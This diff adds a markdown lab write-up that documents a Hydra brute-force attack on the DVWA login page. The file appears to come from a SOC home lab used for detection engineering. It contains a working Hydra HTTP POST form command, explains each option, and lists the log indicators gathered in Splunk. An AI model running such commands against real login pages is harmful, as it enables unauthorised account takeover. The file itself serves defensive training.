@@ -1,0 +1,120 @@
+# Hydra Web Login Brute Force Attack Commands
+
+## Attack Overview
+
+This file documents the commands used to simulate a Web Login Brute Force attack against the DVWA vulnerable application using Hydra.
+
+Attack Type:
+
+```
+Web Login Brute Force
+```
+
+Target:
+
+```
+DVWA Login Page
+```
+
+Tool:
+
+```
+Hydra
+```
+
+MITRE ATT&CK Technique:
+
+```
+T1110 - Brute Force
+```
+
+---
+
+# Target Information
+
+Target URL:
+
+```
+http://<TARGET-IP>/dvwa/login.php
+```
+
+Example:
+
+```
+http://192.168.81.xxx/dvwa/login.php
+```
+
+---
+
+# Wordlist Preparation
+
+Username:
+
+```
+admin
+```
+
+Password wordlist:
+
+```
+passwords.txt
+```
+
+---
+
+# Hydra HTTP POST Form Attack
+
+Command:
+
+```bash
+hydra -l admin -P passwords.txt <TARGET-IP> http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
+```
+
+---
+
+# Command Explanation
+
+| Option           | Description                                              |
+| ---------------- | -------------------------------------------------------- |
+| -l admin         | Specifies the username used during the attack            |
+| -P passwords.txt | Specifies the password wordlist                          |
+| TARGET-IP        | Target DVWA server address                               |
+| http-post-form   | Hydra module for HTTP POST login forms                   |
+| /dvwa/login.php  | Target login endpoint                                    |
+| ^USER^           | Hydra username placeholder                               |
+| ^PASS^           | Hydra password placeholder                               |
+| F=Login failed   | Failure condition used to identify unsuccessful attempts |
+
+---
+
+# Attack Indicators Generated
+
+During the attack, the following activity was generated:
+
+* Multiple HTTP POST requests.
+* Repeated requests to `/dvwa/login.php`.
+* High authentication attempt frequency.
+* Same source IP generating multiple login attempts.
+* Automated User-Agent activity.
+
+These indicators were collected through Apache Access Logs and analyzed in Splunk SIEM.
+
+---
+
+# Evidence Collection
+
+The following screenshots were captured:
+
+```
+screenshots/hydra_execution.png
+```
+
+This screenshot shows the Hydra attack execution and generated login attempts.
+
+---
+
+# Notes
+
+This attack was performed in a controlled SOC Home Lab environment for detection engineering and investigation practice.
+
+No production systems or real user accounts were targeted.
